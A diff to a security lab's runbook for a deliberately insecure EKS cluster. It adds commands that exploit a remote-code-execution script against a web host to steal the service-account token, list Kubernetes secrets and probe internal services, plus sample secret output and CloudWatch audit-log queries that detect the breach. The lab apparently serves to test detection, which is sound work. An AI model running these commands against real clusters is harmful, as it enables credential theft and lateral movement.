@@ -54,17 +54,71 @@
 
 ```sh
 # confirm enabled
-aws eks describe-cluster --name react2shell-eks-secure \
-  --query 'cluster.logging.clusterLogging[?enabled==`true`].types'
+aws eks describe-cluster --name react2shell-eks-insecure --query 'cluster.logging.clusterLogging[?enabled==`true`].types'
+# [
+#     [
+#         "audit",
+#         "authenticator"
+#     ]
+# ]
 
-# replay: SA reads the cluster secret
-python scripts/rce.py http://localhost:3000 "..."
+# SA reads the cluster secret
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets'
+    # {
+    #   "metadata": {
+    #     "name": "cluster-secret",
+    #     "namespace": "internal",
+    #   },
+    #   "data": {
+    #     "password": "Y0x1U1Rlci1TZWNSZVQ="
+    #   },
+    #   "type": "Opaque"
+    # },
+    # {
+    #   "metadata": {
+    #     "name": "container-secret",
+    #     "namespace": "react",
+    #   },
+    #   "data": {
+    #     "password": "Q29OdEFpbkVyLXNFY1JldC1JbnNFQ3VyRQ=="
+    #   },
+    #   "type": "Opaque"
+    # }
+
 
 # query: who read secrets
-aws logs start-query \
-  --log-group-name /aws/eks/react2shell-eks-secure/cluster \
-  --query-string 'fields @timestamp, user.username, verb, objectRef.resource, objectRef.namespace, sourceIPs.0
-    | filter objectRef.resource = "secrets" and verb in ["get","list"]'
+QID=$(aws logs start-query \
+  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
+  --start-time $(date -d '1 hour ago' +%s) \
+  --end-time $(date +%s) \
+  --query-string 'fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sourceIPs.0
+    | filter @logStream like /kube-apiserver-audit/
+    | filter objectRef.resource = "secrets" and verb in ["get","list"]
+    | sort @timestamp desc' \
+  --query queryId --output text)
+
+# poll until "status": "Complete"
+aws logs get-query-results --query-id $QID > log.txt
+```
+
+---
+
+- Query in `CloudWatch`
+
+```sql
+SOURCE "/aws/eks/react2shell-eks-insecure/cluster" START=-3600s END=0s |
+fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sourceIPs.0
+| filter @logStream like /kube-apiserver-audit/
+| filter objectRef.resource = "secrets" and verb in ["get", "list"]
+| sort @timestamp desc
+| limit 100
+
+/*
+2026-10-17T18:08:50.098Z	system:serviceaccount:argocd:argocd-application-controller	list			10.0.33.70
+2026-10-17T18:05:14.216Z	system:serviceaccount:react:react2shell	list			10.0.35.58
+2026-10-17T17:58:49.848Z	system:serviceaccount:argocd:argocd-application-controller	list			10.0.33.70
+*/
+
 ```
 
 ---
@@ -85,20 +139,33 @@ aws logs start-query \
 - confirm
 
 ```sh
-# replay: frontend reaches the backend api
-python scripts/rce.py http://localhost:3000 "curl -sS -m 5 http://backend-api.backend/api/v1/users"
+# replay: react reaches the internal api
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/internal/pods;'
+        # "name": "internal-api-569c897c9f-42mlv",
+        # "namespace": "internal",
+        # "podIP": "10.0.49.30",
+
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -fsSL http://10.0.49.30/api/v1/healthz"
+
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -sS -m 5 http://internal-api.internal/api/v1/users"
+
 
 # query: verdict on the flow
-aws logs start-query \
-  --log-group-name /aws/eks/react2shell-eks-secure/cluster \
-  --query-string 'fields @timestamp, `Src IP`, `Dest IP`, `Dest Port`, Verdict
-    | filter Verdict = "DENY"'
+QID=$(aws logs start-query \
+  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
+  --start-time $(date -d '1 hour ago' +%s) \
+  --end-time $(date +%s) \
+  --query-string 'fields @timestamp, @message
+    | filter @logStream like /network-policy-agent/
+    | sort @timestamp desc' \
+  --query queryId --output text)
+
+aws logs get-query-results --query-id $QID
 ```
 
 - `ACCEPT` on frontend→backend = backend not isolated (missing NetworkPolicy).
 
 ---
-
 
 ## Cloud Monitoring
 
@@ -140,22 +207,36 @@ Enable one source, replay the breach, confirm it shows up.
 
 ## EKS audit log
 
-- `infra/eks-secure/11_eks.tf`: `enabled_log_types = ["audit", "authenticator"]`
+- `infra/eks-insecure/11_eks.tf`: `enabled_log_types = ["audit", "authenticator"]`
 - log group `/aws/eks/<cluster>/cluster`, stream `kube-apiserver-audit-*`
 
 ```sh
 # confirm enabled
-aws eks describe-cluster --name react2shell-eks-secure \
+aws eks describe-cluster --name react2shell-eks-insecure \
   --query 'cluster.logging.clusterLogging[?enabled==`true`].types'
+# [["audit","authenticator"]]
 
 # replay: SA reads the cluster secret
 python scripts/rce.py http://localhost:3000 "..."
+```
 
+Logs Insights is async: `start-query` returns an id, `get-query-results` reads
+it. Both `--start-time` and `--end-time` are required (epoch seconds).
+
+```sh
 # query: who read secrets
-aws logs start-query \
-  --log-group-name /aws/eks/react2shell-eks-secure/cluster \
-  --query-string 'fields @timestamp, user.username, verb, objectRef.resource, objectRef.namespace, sourceIPs.0
-    | filter objectRef.resource = "secrets" and verb in ["get","list"]'
+QID=$(aws logs start-query \
+  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
+  --start-time $(date -d '1 hour ago' +%s) \
+  --end-time $(date +%s) \
+  --query-string 'fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sourceIPs.0
+    | filter @logStream like /kube-apiserver-audit/
+    | filter objectRef.resource = "secrets" and verb in ["get","list"]
+    | sort @timestamp desc' \
+  --query queryId --output text)
+
+# poll until status is Complete
+aws logs get-query-results --query-id $QID
 ```
 
 ---
@@ -172,7 +253,7 @@ python scripts/rce.py http://localhost:3000 "curl -sS -m 5 http://backend-api.ba
 
 # query: verdict on the flow
 aws logs start-query \
-  --log-group-name /aws/eks/react2shell-eks-secure/cluster \
+  --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
   --query-string 'fields @timestamp, `Src IP`, `Dest IP`, `Dest Port`, Verdict
     | filter Verdict = "DENY"'
 ```
